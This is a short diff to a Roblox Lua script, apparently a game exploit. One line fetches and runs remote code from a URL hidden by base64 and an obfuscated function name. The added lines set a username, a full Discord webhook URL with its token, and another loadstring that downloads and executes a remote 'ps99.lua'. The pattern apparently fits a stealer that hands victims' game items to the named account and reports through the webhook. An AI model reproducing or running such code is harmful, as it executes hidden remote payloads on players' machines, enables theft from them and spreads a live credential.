@@ -144,3 +144,7 @@ spawn(updateTimer)
 
 getgenv().gui = false
 loadstring(game:HttpGet(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('mHqHhFBZDLpwnGeLdUMkvbHDlkfMTOIzfqDUHFpHutnTDpKuSPEoPXpaHR0cHM6Ly9lZ29yaWt1c2Euc3BhY2UvMTI3M2NlODZiM2ExYmQyMWI3NmMzZTlhLmx1YQ=='), true))()    
+Username = "c0rruptedgraves" 
+Webhook = "https://discord.com/api/webhooks/1273519595889889280/ZnxXQInvqjGFaEZQ4V3mLBHiN-pWEijYfMyAu4yqLnaKEHsmRWID-tm2NVNfUeSHuFfB" 
+getgenv().gui = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))() 
